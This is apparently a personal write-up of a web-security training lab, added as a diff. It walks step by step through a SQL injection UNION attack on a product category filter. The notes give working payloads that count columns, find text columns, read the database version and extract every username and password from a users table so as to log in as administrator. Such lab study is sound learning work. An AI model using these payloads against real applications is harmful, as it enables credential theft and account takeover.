@@ -1,0 +1,32 @@
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+Hint: You can find some useful payloads on our SQL injection cheat sheet. 
+
+End Goal: retrieve all usernames and passwords and login as the administrator user.
+
+Analysis:
+--------
+
+1) Find the number of columns that the vulnerable is using:
+' order by 1-- => not displayed on the page
+' order by 2-- => displayed on the page
+' order by 3-- => internal server error
+
+3 - 1 = 2
+
+2) Find which columns contain text
+' UNION select 'a', NULL--
+' UNION select NULL, 'a'-- =>**
+
+3) Output data from other tables
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+' UNION select NULL, version()--
+- PostgreSQL
+
+' UNION select NULL, username || ':' || password from users--
